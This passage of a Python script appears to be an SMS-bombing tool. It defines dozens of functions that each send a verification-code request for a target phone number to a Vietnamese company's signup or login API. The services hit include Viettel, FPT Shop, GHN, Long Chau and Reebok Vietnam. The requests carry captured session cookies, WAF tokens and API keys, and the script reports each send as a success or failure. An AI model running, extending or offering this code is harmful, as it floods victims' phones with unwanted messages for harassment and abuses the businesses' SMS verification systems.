        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    params = {
        'code': 'fc9da32a48e6298d54a7a81dbbbcff50',
        'instanceId': '4fc17ac7-654b-406a-847b-efc9b7171ffa',
        'validate': '921c7b9ec5502202ec88625cb96b913e',
    }

    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }

    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BESTEXPRESS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BESTEXPRESS | TRẠNG THÁI : THẤT BẠI")

def ghnexpress():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    try:
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHNEXPRESS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHNEXPRESS | TRẠNG THÁI : THẤT BẠI")

def myviettel():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : THẤT BẠI")

def fptshop():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : THẤT BẠI")

def sapo():
    cookies = {
        'campaign': 'header_app_sapo',
        'referral': 'https://apps.sapo.vn/',
        'G_ENABLED_IDPS': 'google',
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '07/21/2024 12:21:30',
        'pageview': '1',
        'source': 'https://www.sapo.vn/',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'campaign=header_app_sapo; referral=https://apps.sapo.vn/; G_ENABLED_IDPS=google; landing_page=https://www.sapo.vn/; start_time=07/21/2024 12:21:30; pageview=1; source=https://www.sapo.vn/',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'phonenumber': sdt,
    }

    try:
        response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : THẤT BẠI")

def paynet():
    cookies = {
        '__RequestVerificationToken': 'LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1',
        'ASP.NET_SessionId': 'a50onuvzqyt4onxiosf1xnqo',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '__RequestVerificationToken=LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1; ASP.NET_SessionId=a50onuvzqyt4onxiosf1xnqo',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'MobileNumber': sdt,
        'IsForget': 'N',
    }

    try:
        response = requests.post('https://merchant.paynetone.vn/User/GetOTP', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PAYNET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PAYNET | TRẠNG THÁI : THẤT BẠI")

def reebok():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '0134f9fc8e5bb3de6352617eacc195a2',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721548395723',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("REEBOK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("REEBOK | TRẠNG THÁI : THẤT BẠI")

def gapowork():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.gapowork.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.gapowork.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-gapo-lang': 'vi',
    }

    json_data = {
        'phone_number': sdt,
        'device_id': '726d8613-ca37-46bd-b7af-1b79c102c0cd',
        'device_model': 'web',
    }

    try:
        response = requests.post('https://api.gapowork.vn/auth/v3.1/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GAPOWORK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GAPOWORK | TRẠNG THÁI : THẤT BẠI")

def shine():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post(
            'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("30SHINE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("30SHINE | TRẠNG THÁI : THẤT BẠI")

def oreka():
    cookies = {
        '__ork_u': '',
        '__ork_u_idt': '',
        '__ork_u_ph': '',
        'AWSALB': 'SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': '__ork_u=; __ork_u_idt=; __ork_u_ph=; AWSALB=SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
        'origin': 'https://www.oreka.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.oreka.vn/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-by-platform': 'PC_WEB',
    }

    json_data = {
        'variables': {
            'phone': sdt,
            'locale': 'vi',
        },
        'query': 'mutation ($phone: String!, $locale: String!) {\n  sendVerifyPhoneApp(phone: $phone, locale: $locale)\n}',
    }

    try:
        response = requests.post('https://www.oreka.vn/graphql', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OREKA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("OREKA | TRẠNG THÁI : THẤT BẠI")

def fmstyle():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://fm.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fm.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '862aab0f-2da0-4ea4-9e3d-358f619a2ad2',
    }

    json_data = {
        'Phone': sdt,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Browser': '',
    }

    try:
        response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FMSTYLE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FMSTYLE | TRẠNG THÁI : THẤT BẠI")

def circa():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'authorization': '',
        'content-type': 'application/json',
        'grpc-timeout': '30S',
        'origin': 'https://circa.vn',
        'priority': 'u=1, i',
        'referer': 'https://circa.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': {
            'country_code': '84',  # Giả sử mã quốc gia là '84'
            'phone_number': sdt[1:],  # Lấy phần còn lại của số điện thoại
        },
    }

    try:
        response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CIRCA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CIRCA | TRẠNG THÁI : THẤT BẠI")

def acfc():
    cookies = {
        'form_key': 'NAeTVepv8jfDGFEt',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'optiMonkClientId': '031e2e37-cd11-5d7f-bdd8-87671934b9a6',
        'optiMonkSession': '1721551346',
        'PHPSESSID': 'km715lglu45ngr7e6ubngf6f1a',
        'form_key': 'NAeTVepv8jfDGFEt',
        'private_content_version': 'd62e46921486bf21498614890d7e6251',
        'mgn_location_popup': 'southern',
        'X-Magento-Vary': '1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc',
        'mage-cache-sessid': 'true',
        'aws-waf-token': '9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==',
        'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=NAeTVepv8jfDGFEt; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=031e2e37-cd11-5d7f-bdd8-87671934b9a6; optiMonkSession=1721551346; PHPSESSID=km715lglu45ngr7e6ubngf6f1a; form_key=NAeTVepv8jfDGFEt; private_content_version=d62e46921486bf21498614890d7e6251; mgn_location_popup=southern; X-Magento-Vary=1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc; mage-cache-sessid=true; aws-waf-token=9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
        'origin': 'https://www.acfc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.acfc.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'NAeTVepv8jfDGFEt',
        'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ACFC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ACFC | TRẠNG THÁI : THẤT BẠI")

def fptlongchauzl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': sdt,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    try:
        response = requests.post(
            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTLONGCHAUZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTLONGCHAUZL | TRẠNG THÁI : THẤT BẠI")

def thuocsi():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://thuocsi.vn',
        'priority': 'u=1, i',
        'referer': 'https://thuocsi.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-request-id': '1721576026076',
        'x-request-path': '/marketplace/customer/v1/register',
    }

    json_data = {
        'scope': 'DENTISTRY',
        'businessName': 'Nha khoa',
        'address': '53 et 3',
        'provinceCode': '95',
        'districtCode': '958',
        'wardCode': '31912',
        'phone': sdt,
        'referCode': '',
        'isNewFlow': True,
        'verificationCode': '',
    }

    try:
        response = requests.post('https://v2api.thuocsi.vn/marketplace/customer/v1/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THUOCSI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THUOCSI | TRẠNG THÁI : THẤT BẠI")

def pantio():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PANTIO | TRẠNG THÁI : THẤT BẠI")

def pantioresend():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/resend', params=params, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIORESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PANTIORESEND | TRẠNG THÁI : THẤT BẠI")

def winny():
    cookies = {
        'PHPSESSID': '1ead98730f607548ac0c2f370f8c2dbe',
        'X-Magento-Vary': '3ea997b53ecbf5fe274e7bf3c497ad101c488a4c',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'form_key': 'p2sTfiaO8ihlRup7',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'private_content_version': '87379c6193f6b8c7933f3a0f50cec8ef',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=1ead98730f607548ac0c2f370f8c2dbe; X-Magento-Vary=3ea997b53ecbf5fe274e7bf3c497ad101c488a4c; form_key=p2sTfiaO8ihlRup7; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=p2sTfiaO8ihlRup7; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=87379c6193f6b8c7933f3a0f50cec8ef',
        'origin': 'https://winny.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://winny.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobileNumber': sdt,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'p2sTfiaO8ihlRup7',
    }

    try:
        response = requests.post('https://winny.com.vn/otp/otp/send', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINNY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WINNY | TRẠNG THÁI : THẤT BẠI")

def owen():
    cookies = {
        'form_key': 'mVMv3IDcYvxwDHNH',
        'form_key': 'mVMv3IDcYvxwDHNH',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'PHPSESSID': 'd040280e2517e2280569a7db522d5988',
        'mage-messages': '',
        'section_data_ids': '%7B%22insiderSection%22%3A1721578899%7D',
        'private_content_version': 'a38eb3ce2c465d1e78c1d0d15bd51ee4',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
